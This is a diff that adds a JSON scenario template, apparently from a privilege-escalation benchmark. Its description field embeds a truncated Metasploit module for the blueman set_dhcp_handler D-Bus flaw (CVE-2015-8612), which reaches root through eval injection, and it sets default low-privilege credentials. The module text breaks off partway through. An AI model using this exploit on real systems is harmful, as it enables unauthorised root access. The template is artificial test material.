@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46186",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: blueman - set_dhcp_handler D-Bus Privilege Escalation (Metasploit) (CVE-2015-8612)\n\nExploit source code (46186.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'blueman set_dhcp_handler D-Bus Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges by exploiting a Python\n        code injection vulnerability in blueman versions prior to 2.0.3.\n\n        The `org.blueman.Mechanism.EnableNetwork` D-Bus interface exposes the\n        `set_dhcp_handler` function which uses user input in a call to `eval`,\n        without sanitization, resulting in arbitrary code execution as root.\n\n        This module has been tested successfully with blueman version 1.23\n        on Debian 8 Jessie (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'the grugq', # Discovery and exploit\n          'bcoles'     # Metasploit\n        ],\n      'DisclosureDate' => '2015-12-18',\n      'References'     =>\n        [\n          ['BID', '79688'],\n          ['CVE', '2015-8612'],\n          ['URL', 'https://twitter.com/thegrugq/status/677809527882813440'],\n          ['URL', 'https://github.com/blueman-project/blueman/issues/416'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2015/12/18/6'],\n          ['URL', 'https://www.debian.org/security/2015/dsa-3427'],\n          ['URL', 'https://bugs.mageia.org/show_bug.cgi?id=17361'],\n          ['URL', 'http://www.slackware.com/security/viewer.php?l=slackware-security&y=2015&m=slackware-security.421085']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'DefaultTarget'  => 0))\n    register_advanced_options [\n      OptBool.new('ForceExploit', [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def dbus_send(dest:, type:, path:, interface:, contents:)\n    cmd_exec \"dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}\"\n  end\n\n  def check\n    unless command_exists? 'dbus-send'\n      vprint_error 'dbus-send is not installed. E\n```",
+  "cve": "CVE-2015-8612",
+  "exploitdb_id": "46186",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46186",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
